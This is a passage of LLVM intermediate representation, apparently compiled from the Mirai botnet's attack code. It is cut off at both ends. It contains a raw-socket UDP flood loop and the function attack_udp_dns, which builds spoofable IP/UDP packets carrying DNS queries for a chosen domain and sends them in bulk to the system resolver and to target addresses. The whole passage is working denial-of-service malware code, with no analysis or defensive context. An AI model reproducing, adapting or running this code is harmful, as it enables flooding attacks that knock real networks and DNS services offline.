  %90 = getelementptr inbounds i8, i8* %80, i64 2
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %13) #10
  %93 = getelementptr inbounds i8, i8* %80, i64 4
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 4
  %95 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %15, i8* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %97 = getelementptr inbounds i8, i8* %80, i64 6
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 17, i8* %99, align 1
  %100 = load i32, i32* @LOCAL_ADDR, align 4
  %101 = getelementptr inbounds i8, i8* %80, i64 12
  %102 = bitcast i8* %101 to i32*
  store i32 %100, i32* %102, align 4
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %81, i32 1
  %104 = load i32, i32* %103, align 4
  %105 = getelementptr inbounds i8, i8* %80, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %19) #10
  %108 = bitcast i8* %83 to i16*
  store i16 %107, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %21) #10
  %110 = getelementptr inbounds i8, i8* %80, i64 22
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = add i16 %87, 12
  %113 = call zeroext i16 @htons(i16 zeroext %112) #10
  %114 = getelementptr inbounds i8, i8* %80, i64 24
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = bitcast i8* %84 to i32*
  store i32 -1, i32* %116, align 4
  %117 = getelementptr inbounds i8, i8* %80, i64 32
  call void @util_memcpy(i8* %117, i8* %22, i32 %86) #9
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %29
  br i1 %120, label %.lr.ph73.split, label %.preheader.loopexit88

.loopexit.loopexit:                               ; preds = %._crit_edge76
  br label %.loopexit.backedge

.loopexit.loopexit87:                             ; preds = %._crit_edge
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit87
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %74, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %._crit_edge76
  %storemerge7072.us = phi i32 [ %168, %._crit_edge76 ], [ 0, %.lr.ph.split.us.preheader ]
  %121 = sext i32 %storemerge7072.us to i64
  %122 = getelementptr inbounds i8*, i8** %9, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  %125 = getelementptr inbounds i8, i8* %123, i64 20
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = icmp ult i8 %127, 32
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %.lr.ph.split.us
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #10
  %133 = call i32 @htonl(i32 %132) #10
  %134 = getelementptr inbounds i8, i8* %123, i64 16
  %135 = bitcast i8* %134 to i32*
  store i32 %133, i32* %135, align 4
  br label %136

; <label>:136:                                    ; preds = %.lr.ph.split.us, %129
  %137 = getelementptr inbounds i8, i8* %123, i64 4
  %138 = bitcast i8* %137 to i16*
  store i16 0, i16* %138, align 4
  br i1 %76, label %139, label %141

; <label>:139:                                    ; preds = %136
  %140 = bitcast i8* %125 to i16*
  store i16 0, i16* %140, align 2
  br label %141

; <label>:141:                                    ; preds = %139, %136
  %142 = getelementptr inbounds i8, i8* %123, i64 22
  %143 = bitcast i8* %142 to i16*
  br i1 %78, label %144, label %._crit_edge76

; <label>:144:                                    ; preds = %141
  store i16 0, i16* %143, align 2
  br label %._crit_edge76

._crit_edge76:                                    ; preds = %141, %144
  %145 = getelementptr inbounds i8, i8* %123, i64 10
  %146 = bitcast i8* %145 to i16*
  store i16 0, i16* %146, align 2
  %147 = bitcast i8* %123 to i16*
  %148 = call zeroext i16 @checksum_generic(i16* %147, i32 20) #9
  store i16 %148, i16* %146, align 2
  %149 = getelementptr inbounds i8, i8* %123, i64 26
  %150 = bitcast i8* %149 to i16*
  store i16 0, i16* %150, align 2
  %151 = getelementptr inbounds i8, i8* %123, i64 24
  %152 = bitcast i8* %151 to i16*
  %153 = load i16, i16* %152, align 2
  %154 = load i32, i32* %6, align 4
  %155 = add i32 %154, 12
  %156 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %124, i8* nonnull %125, i16 zeroext %153, i32 %155) #9
  store i16 %156, i16* %150, align 2
  %157 = load i16, i16* %143, align 2
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0, i32 1
  store i16 %157, i16* %160, align 2
  %161 = load i32, i32* %6, align 4
  %162 = sext i32 %161 to i64
  %163 = add nsw i64 %162, 32
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0
  %165 = bitcast %struct.sockaddr_in* %164 to %struct.sockaddr*
  %166 = call i64 @sendto(i32 %23, i8* nonnull %123, i64 %163, i32 16384, %struct.sockaddr* %165, i32 16) #9
  %167 = load i32, i32* %5, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %5, align 4
  %169 = icmp slt i32 %168, %29
  br i1 %169, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %._crit_edge
  %storemerge7072 = phi i32 [ %215, %._crit_edge ], [ 0, %.lr.ph.split.preheader ]
  %170 = sext i32 %storemerge7072 to i64
  %171 = getelementptr inbounds i8*, i8** %9, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  %174 = getelementptr inbounds i8, i8* %172, i64 20
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 2
  %176 = load i8, i8* %175, align 4
  %177 = icmp ult i8 %176, 32
  br i1 %177, label %178, label %185

; <label>:178:                                    ; preds = %.lr.ph.split
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #10
  %182 = call i32 @htonl(i32 %181) #10
  %183 = getelementptr inbounds i8, i8* %172, i64 16
  %184 = bitcast i8* %183 to i32*
  store i32 %182, i32* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %.lr.ph.split, %178
  br i1 %76, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %174 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  %189 = getelementptr inbounds i8, i8* %172, i64 22
  %190 = bitcast i8* %189 to i16*
  br i1 %78, label %191, label %._crit_edge

; <label>:191:                                    ; preds = %188
  store i16 0, i16* %190, align 2
  br label %._crit_edge

._crit_edge:                                      ; preds = %188, %191
  %192 = getelementptr inbounds i8, i8* %172, i64 10
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 2
  %194 = bitcast i8* %172 to i16*
  %195 = call zeroext i16 @checksum_generic(i16* %194, i32 20) #9
  store i16 %195, i16* %193, align 2
  %196 = getelementptr inbounds i8, i8* %172, i64 26
  %197 = bitcast i8* %196 to i16*
  store i16 0, i16* %197, align 2
  %198 = getelementptr inbounds i8, i8* %172, i64 24
  %199 = bitcast i8* %198 to i16*
  %200 = load i16, i16* %199, align 2
  %201 = load i32, i32* %6, align 4
  %202 = add i32 %201, 12
  %203 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %173, i8* %174, i16 zeroext %200, i32 %202) #9
  store i16 %203, i16* %197, align 2
  %204 = load i16, i16* %190, align 2
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %206, i32 0, i32 1
  store i16 %204, i16* %207, align 2
  %208 = load i32, i32* %6, align 4
  %209 = sext i32 %208 to i64
  %210 = add nsw i64 %209, 32
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %206, i32 0
  %212 = bitcast %struct.sockaddr_in* %211 to %struct.sockaddr*
  %213 = call i64 @sendto(i32 %23, i8* %172, i64 %210, i32 16384, %struct.sockaddr* %212, i32 16) #9
  %214 = load i32, i32* %5, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %5, align 4
  %216 = icmp slt i32 %215, %29
  br i1 %216, label %.lr.ph.split, label %.loopexit.loopexit87

; <label>:217:                                    ; preds = %4, %71
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 12)
  %24 = trunc i32 %23 to i8
  %25 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %26 = tail call fastcc i32 @get_dns_resolver()
  %27 = icmp eq i8* %25, null
  br i1 %27, label %280, label %28

; <label>:28:                                     ; preds = %4
  %29 = tail call i32 @util_strlen(i8* nonnull %25) #9
  %30 = tail call i32 @socket(i32 2, i32 3, i32 17) #9
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %280, label %32

; <label>:32:                                     ; preds = %28
  store i32 1, i32* %5, align 4
  %33 = bitcast i32* %5 to i8*
  %34 = call i32 @setsockopt(i32 %30, i32 0, i32 3, i8* nonnull %33, i32 4) #9
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %116, label %.preheader122

.preheader122:                                    ; preds = %32
  store i32 0, i32* %5, align 4
  %36 = zext i8 %0 to i32
  %37 = icmp eq i8 %0, 0
  %.pre = and i32 %23, 255
  br i1 %37, label %.preheader122..preheader_crit_edge, label %.lr.ph130

.preheader122..preheader_crit_edge:               ; preds = %.preheader122
  %.pre139 = sext i32 %29 to i64
  br label %.preheader

.lr.ph130:                                        ; preds = %.preheader122
  %38 = zext i32 %.pre to i64
  %39 = sext i32 %29 to i64
  %40 = add nuw nsw i64 %38, 47
  %41 = add nsw i64 %40, %39
  %42 = trunc i64 %41 to i16
  %43 = icmp eq i8 %16, 0
  %44 = add nuw nsw i64 %38, 27
  %45 = add nsw i64 %44, %39
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %29, 1
  %48 = icmp sgt i32 %29, 0
  %wide.trip.count = zext i32 %29 to i64
  br i1 %43, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  %xtraiter148 = and i64 %wide.trip.count, 1
  %lcmp.mod149 = icmp eq i64 %xtraiter148, 0
  %49 = icmp eq i32 %29, 1
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %50 = icmp eq i32 %29, 1
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %._crit_edge.us
  %51 = phi i32 [ %103, %._crit_edge.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %52 = call noalias i8* @calloc(i64 600, i64 1) #9
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds i8*, i8** %8, i64 %53
  store i8* %52, i8** %54, align 8
  %55 = getelementptr inbounds i8, i8* %52, i64 20
  %56 = getelementptr inbounds i8, i8* %52, i64 28
  %57 = getelementptr inbounds i8, i8* %52, i64 40
  store i8 69, i8* %52, align 4
  %58 = getelementptr inbounds i8, i8* %52, i64 1
  store i8 %10, i8* %58, align 1
  %59 = call zeroext i16 @htons(i16 zeroext %42) #10
  %60 = getelementptr inbounds i8, i8* %52, i64 2
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = call zeroext i16 @htons(i16 zeroext %12) #10
  %63 = getelementptr inbounds i8, i8* %52, i64 4
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 4
  %65 = getelementptr inbounds i8, i8* %52, i64 8
  store i8 %14, i8* %65, align 4
  %66 = getelementptr inbounds i8, i8* %52, i64 9
  store i8 17, i8* %66, align 1
  %67 = load i32, i32* @LOCAL_ADDR, align 4
  %68 = getelementptr inbounds i8, i8* %52, i64 12
  %69 = bitcast i8* %68 to i32*
  store i32 %67, i32* %69, align 4
  %70 = getelementptr inbounds i8, i8* %52, i64 16
  %71 = bitcast i8* %70 to i32*
  store i32 %26, i32* %71, align 4
  %72 = call zeroext i16 @htons(i16 zeroext %18) #10
  %73 = bitcast i8* %55 to i16*
  store i16 %72, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %20) #10
  %75 = getelementptr inbounds i8, i8* %52, i64 22
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 2
  %77 = call zeroext i16 @htons(i16 zeroext %46) #10
  %78 = getelementptr inbounds i8, i8* %52, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %22) #10
  %81 = bitcast i8* %56 to i16*
  store i16 %80, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext 256) #10
  %83 = getelementptr inbounds i8, i8* %52, i64 30
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext 1) #10
  %86 = getelementptr inbounds i8, i8* %52, i64 32
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = getelementptr inbounds i8, i8* %52, i64 41
  store i8 %24, i8* %57, align 1
  %89 = getelementptr inbounds i8, i8* %88, i64 %38
  %90 = getelementptr inbounds i8, i8* %89, i64 1
  call void @util_memcpy(i8* %90, i8* nonnull %25, i32 %47) #9
  br i1 %48, label %.lr.ph128.us.preheader, label %._crit_edge.us

.lr.ph128.us.preheader:                           ; preds = %.lr.ph130.split.us
  br i1 %lcmp.mod, label %.lr.ph128.us.prol.loopexit.unr-lcssa, label %.lr.ph128.us.prol.preheader

.lr.ph128.us.prol.preheader:                      ; preds = %.lr.ph128.us.preheader
  br label %.lr.ph128.us.prol

.lr.ph128.us.prol:                                ; preds = %.lr.ph128.us.prol.preheader
  %91 = load i8, i8* %25, align 1
  %92 = icmp eq i8 %91, 46
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %.lr.ph128.us.prol
  br label %96

; <label>:94:                                     ; preds = %.lr.ph128.us.prol
  store i8 0, i8* %89, align 1
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  br label %96

; <label>:96:                                     ; preds = %94, %93
  %.1119.us.prol = phi i8* [ %95, %94 ], [ %89, %93 ]
  %.1.us.prol = phi i8 [ 0, %94 ], [ 1, %93 ]
  br label %.lr.ph128.us.prol.loopexit.unr-lcssa

.lr.ph128.us.prol.loopexit.unr-lcssa:             ; preds = %.lr.ph128.us.preheader, %96
  %.1119.us.lcssa.unr.ph = phi i8* [ %.1119.us.prol, %96 ], [ undef, %.lr.ph128.us.preheader ]
  %.1.us.lcssa.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ undef, %.lr.ph128.us.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %96 ], [ 0, %.lr.ph128.us.preheader ]
  %.0115126.us.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ 0, %.lr.ph128.us.preheader ]
  %.0118124.us.unr.ph = phi i8* [ %.1119.us.prol, %96 ], [ %89, %.lr.ph128.us.preheader ]
  br label %.lr.ph128.us.prol.loopexit

.lr.ph128.us.prol.loopexit:                       ; preds = %.lr.ph128.us.prol.loopexit.unr-lcssa
  br i1 %50, label %._crit_edge.us.loopexit, label %.lr.ph128.us.preheader.new

.lr.ph128.us.preheader.new:                       ; preds = %.lr.ph128.us.prol.loopexit
  br label %.lr.ph128.us

._crit_edge.us.loopexit.unr-lcssa:                ; preds = %286
  br label %._crit_edge.us.loopexit

._crit_edge.us.loopexit:                          ; preds = %.lr.ph128.us.prol.loopexit, %._crit_edge.us.loopexit.unr-lcssa
  %.1119.us.lcssa = phi i8* [ %.1119.us.lcssa.unr.ph, %.lr.ph128.us.prol.loopexit ], [ %.1119.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  %.1.us.lcssa = phi i8 [ %.1.us.lcssa.unr.ph, %.lr.ph128.us.prol.loopexit ], [ %.1.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  br label %._crit_edge.us

._crit_edge.us:                                   ; preds = %._crit_edge.us.loopexit, %.lr.ph130.split.us
  %.0118.lcssa.us = phi i8* [ %89, %.lr.ph130.split.us ], [ %.1119.us.lcssa, %._crit_edge.us.loopexit ]
  %.0115.lcssa.us = phi i8 [ 0, %.lr.ph130.split.us ], [ %.1.us.lcssa, %._crit_edge.us.loopexit ]
  store i8 %.0115.lcssa.us, i8* %.0118.lcssa.us, align 1
  %97 = getelementptr inbounds i8, i8* %89, i64 %39
  %98 = getelementptr inbounds i8, i8* %97, i64 2
  %99 = bitcast i8* %98 to i16*
  store i16 %85, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %98, i64 2
  %101 = bitcast i8* %100 to i16*
  store i16 %85, i16* %101, align 2
  %102 = load i32, i32* %5, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %5, align 4
  %104 = icmp slt i32 %103, %36
  br i1 %104, label %.lr.ph130.split.us, label %.preheader.loopexit

.lr.ph128.us:                                     ; preds = %286, %.lr.ph128.us.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph128.us.preheader.new ], [ %indvars.iv.next.1, %286 ]
  %.0115126.us = phi i8 [ %.0115126.us.unr.ph, %.lr.ph128.us.preheader.new ], [ %.1.us.1, %286 ]
  %.0118124.us = phi i8* [ %.0118124.us.unr.ph, %.lr.ph128.us.preheader.new ], [ %.1119.us.1, %286 ]
  %105 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv
  %106 = load i8, i8* %105, align 1
  %107 = icmp eq i8 %106, 46
  br i1 %107, label %110, label %108

; <label>:108:                                    ; preds = %.lr.ph128.us
  %109 = add i8 %.0115126.us, 1
  br label %.lr.ph128.us.1147

; <label>:110:                                    ; preds = %.lr.ph128.us
  store i8 %.0115126.us, i8* %.0118124.us, align 1
  %111 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  br label %.lr.ph128.us.1147

.lr.ph128.us.1147:                                ; preds = %110, %108
  %.1119.us = phi i8* [ %112, %110 ], [ %.0118124.us, %108 ]
  %.1.us = phi i8 [ 0, %110 ], [ %109, %108 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %113 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next
  %114 = load i8, i8* %113, align 1
  %115 = icmp eq i8 %114, 46
  br i1 %115, label %283, label %281

; <label>:116:                                    ; preds = %32
  %117 = call i32 @close(i32 %30) #9
  br label %280

.preheader.loopexit:                              ; preds = %._crit_edge.us
  br label %.preheader

.preheader.loopexit146:                           ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit146, %.preheader.loopexit, %.preheader122..preheader_crit_edge
  %.pre-phi140 = phi i64 [ %.pre139, %.preheader122..preheader_crit_edge ], [ %39, %.preheader.loopexit ], [ %39, %.preheader.loopexit146 ]
  %118 = and i32 %11, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = and i32 %17, 65535
  %121 = icmp eq i32 %120, 65535
  %122 = and i32 %19, 65535
  %123 = icmp eq i32 %122, 65535
  %124 = and i32 %21, 65535
  %125 = icmp eq i32 %124, 65535
  %126 = add nuw nsw i32 %.pre, 27
  %127 = add i32 %126, %29
  %addconv132 = add nuw nsw i32 %.pre, 47
  %128 = zext i32 %addconv132 to i64
  %129 = add nsw i64 %128, %.pre-phi140
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %._crit_edge
  %130 = phi i32 [ %196, %._crit_edge ], [ 0, %.lr.ph130.split.preheader ]
  %131 = call noalias i8* @calloc(i64 600, i64 1) #9
  %132 = sext i32 %130 to i64
  %133 = getelementptr inbounds i8*, i8** %8, i64 %132
  store i8* %131, i8** %133, align 8
  %134 = getelementptr inbounds i8, i8* %131, i64 20
  %135 = getelementptr inbounds i8, i8* %131, i64 28
  %136 = getelementptr inbounds i8, i8* %131, i64 40
  store i8 69, i8* %131, align 4
  %137 = getelementptr inbounds i8, i8* %131, i64 1
  store i8 %10, i8* %137, align 1
  %138 = call zeroext i16 @htons(i16 zeroext %42) #10
  %139 = getelementptr inbounds i8, i8* %131, i64 2
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = call zeroext i16 @htons(i16 zeroext %12) #10
  %142 = getelementptr inbounds i8, i8* %131, i64 4
  %143 = bitcast i8* %142 to i16*
  store i16 %141, i16* %143, align 4
  %144 = getelementptr inbounds i8, i8* %131, i64 8
  store i8 %14, i8* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %146 = getelementptr inbounds i8, i8* %131, i64 6
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = getelementptr inbounds i8, i8* %131, i64 9
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* @LOCAL_ADDR, align 4
  %150 = getelementptr inbounds i8, i8* %131, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %131, i64 16
  %153 = bitcast i8* %152 to i32*
  store i32 %26, i32* %153, align 4
  %154 = call zeroext i16 @htons(i16 zeroext %18) #10
  %155 = bitcast i8* %134 to i16*
  store i16 %154, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %20) #10
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %46) #10
  %160 = getelementptr inbounds i8, i8* %131, i64 24
  %161 = bitcast i8* %160 to i16*
  store i16 %159, i16* %161, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %22) #10
  %163 = bitcast i8* %135 to i16*
  store i16 %162, i16* %163, align 2
  %164 = call zeroext i16 @htons(i16 zeroext 256) #10
  %165 = getelementptr inbounds i8, i8* %131, i64 30
  %166 = bitcast i8* %165 to i16*
  store i16 %164, i16* %166, align 2
  %167 = call zeroext i16 @htons(i16 zeroext 1) #10
  %168 = getelementptr inbounds i8, i8* %131, i64 32
  %169 = bitcast i8* %168 to i16*
  store i16 %167, i16* %169, align 2
  %170 = getelementptr inbounds i8, i8* %131, i64 41
  store i8 %24, i8* %136, align 1
  %171 = getelementptr inbounds i8, i8* %170, i64 %38
  %172 = getelementptr inbounds i8, i8* %171, i64 1
  call void @util_memcpy(i8* %172, i8* nonnull %25, i32 %47) #9
  br i1 %48, label %.lr.ph128.preheader, label %._crit_edge

.lr.ph128.preheader:                              ; preds = %.lr.ph130.split
  br i1 %lcmp.mod149, label %.lr.ph128.prol.loopexit.unr-lcssa, label %.lr.ph128.prol.preheader

.lr.ph128.prol.preheader:                         ; preds = %.lr.ph128.preheader
  br label %.lr.ph128.prol

.lr.ph128.prol:                                   ; preds = %.lr.ph128.prol.preheader
  %173 = load i8, i8* %25, align 1
  %174 = icmp eq i8 %173, 46
  br i1 %174, label %176, label %175

; <label>:175:                                    ; preds = %.lr.ph128.prol
  br label %178

; <label>:176:                                    ; preds = %.lr.ph128.prol
  store i8 0, i8* %171, align 1
  %177 = getelementptr inbounds i8, i8* %171, i64 1
  br label %178

; <label>:178:                                    ; preds = %176, %175
  %.1119.prol = phi i8* [ %177, %176 ], [ %171, %175 ]
  %.1.prol = phi i8 [ 0, %176 ], [ 1, %175 ]
  br label %.lr.ph128.prol.loopexit.unr-lcssa

.lr.ph128.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph128.preheader, %178
  %.1119.lcssa.unr.ph = phi i8* [ %.1119.prol, %178 ], [ undef, %.lr.ph128.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %178 ], [ undef, %.lr.ph128.preheader ]
  %indvars.iv135.unr.ph = phi i64 [ 1, %178 ], [ 0, %.lr.ph128.preheader ]
  %.0115126.unr.ph = phi i8 [ %.1.prol, %178 ], [ 0, %.lr.ph128.preheader ]
  %.0118124.unr.ph = phi i8* [ %.1119.prol, %178 ], [ %171, %.lr.ph128.preheader ]
  br label %.lr.ph128.prol.loopexit

.lr.ph128.prol.loopexit:                          ; preds = %.lr.ph128.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge.loopexit, label %.lr.ph128.preheader.new

.lr.ph128.preheader.new:                          ; preds = %.lr.ph128.prol.loopexit
  br label %.lr.ph128

.lr.ph128:                                        ; preds = %292, %.lr.ph128.preheader.new
  %indvars.iv135 = phi i64 [ %indvars.iv135.unr.ph, %.lr.ph128.preheader.new ], [ %indvars.iv.next136.1, %292 ]
  %.0115126 = phi i8 [ %.0115126.unr.ph, %.lr.ph128.preheader.new ], [ %.1.1, %292 ]
  %.0118124 = phi i8* [ %.0118124.unr.ph, %.lr.ph128.preheader.new ], [ %.1119.1, %292 ]
  %179 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv135
  %180 = load i8, i8* %179, align 1
  %181 = icmp eq i8 %180, 46
  br i1 %181, label %182, label %185

; <label>:182:                                    ; preds = %.lr.ph128
  store i8 %.0115126, i8* %.0118124, align 1
  %183 = getelementptr inbounds i8, i8* %171, i64 %indvars.iv135
  %184 = getelementptr inbounds i8, i8* %183, i64 1
  br label %.lr.ph128.1150

; <label>:185:                                    ; preds = %.lr.ph128
  %186 = add i8 %.0115126, 1
  br label %.lr.ph128.1150

.lr.ph128.1150:                                   ; preds = %182, %185
  %.1119 = phi i8* [ %184, %182 ], [ %.0118124, %185 ]
  %.1 = phi i8 [ 0, %182 ], [ %186, %185 ]
  %indvars.iv.next136 = add nuw nsw i64 %indvars.iv135, 1
  %187 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next136
  %188 = load i8, i8* %187, align 1
  %189 = icmp eq i8 %188, 46
  br i1 %189, label %289, label %287

._crit_edge.loopexit.unr-lcssa:                   ; preds = %292
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph128.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1119.lcssa = phi i8* [ %.1119.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1119.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.lr.ph130.split
  %.0118.lcssa = phi i8* [ %171, %.lr.ph130.split ], [ %.1119.lcssa, %._crit_edge.loopexit ]
  %.0115.lcssa = phi i8 [ 0, %.lr.ph130.split ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0115.lcssa, i8* %.0118.lcssa, align 1
  %190 = getelementptr inbounds i8, i8* %171, i64 %39
  %191 = getelementptr inbounds i8, i8* %190, i64 2
  %192 = bitcast i8* %191 to i16*
  store i16 %167, i16* %192, align 2
  %193 = getelementptr inbounds i8, i8* %191, i64 2
  %194 = bitcast i8* %193 to i16*
  store i16 %167, i16* %194, align 2
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
